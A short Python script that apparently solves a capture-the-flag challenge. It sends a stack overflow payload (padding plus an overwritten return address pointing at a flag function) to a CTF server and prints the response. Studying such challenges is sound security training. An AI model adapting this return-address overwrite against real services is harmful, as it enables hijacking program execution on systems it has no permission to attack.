import socket
import time
from struct import pack

HOST = "ctf.idi.ntnu.no"
PORT = 5009  

try:
    
    offset = 40
    flag_addr = 0x401192  

    payload = b"A" * 32
    payload += b"B" * 8 
    payload += pack("<Q", flag_addr) 

    print(f"\nPayload sent to server: \n{payload}")

    s = socket.socket()
    s.connect((HOST, PORT))
    s.sendall(payload + b"\n")

    time.sleep(0.5) # necessary sleep so that response is recieved before print

    response = s.recv(1024).decode(errors="ignore")

    print(f"\nResponse from server: \n{response}")

    s.close()

except Exception as e:
    print(f"Connection error: {e}")
    
